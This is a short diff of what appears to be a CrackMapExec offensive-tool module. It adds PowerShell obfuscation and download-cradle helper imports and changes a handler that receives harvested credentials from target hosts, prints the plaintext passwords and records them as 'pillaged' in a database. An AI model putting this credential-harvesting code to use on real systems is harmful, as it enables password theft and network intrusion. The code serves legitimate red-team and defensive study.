@@ -1,6 +1,6 @@
-from cme.helpers.powershell import obfs_ps_script
+from cme.helpers.powershell import obfs_ps_script, gen_ps_iex_cradle, create_ps_command
 from cme.helpers.misc import validate_ntlm
-from cme.helpers.logger import write_log
+from cme.helpers.logger import write_log, highlight
 from datetime import datetime
 import re
 
@@ -185,7 +185,7 @@ class CMEModule:
         length = int(response.headers.getheader('content-length'))
         data = response.rfile.read(length)
 
-        #We've received the response, stop tracking this host
+        # We've received the response, stop tracking this host
         response.stop_tracking_host()
 
         if len(data):
@@ -194,9 +194,9 @@ class CMEModule:
                 if len(creds):
                     for cred_set in creds:
                         credtype, domain, username, password,_,_ = cred_set
-                        #Get the hostid from the DB
+                        # Get the hostid from the DB
                         hostid = context.db.get_computers(response.client_address[0])[0][0]
-                        context.db.add_credential(credtype, domain, username, password, hostid)
+                        context.db.add_credential(credtype, domain, username, password, pillaged_from=hostid)
                         context.log.highlight('{}\\{}:{}'.format(domain, username, password))
 
                     context.log.success("Added {} credential(s) to the database".format(highlight(len(creds))))
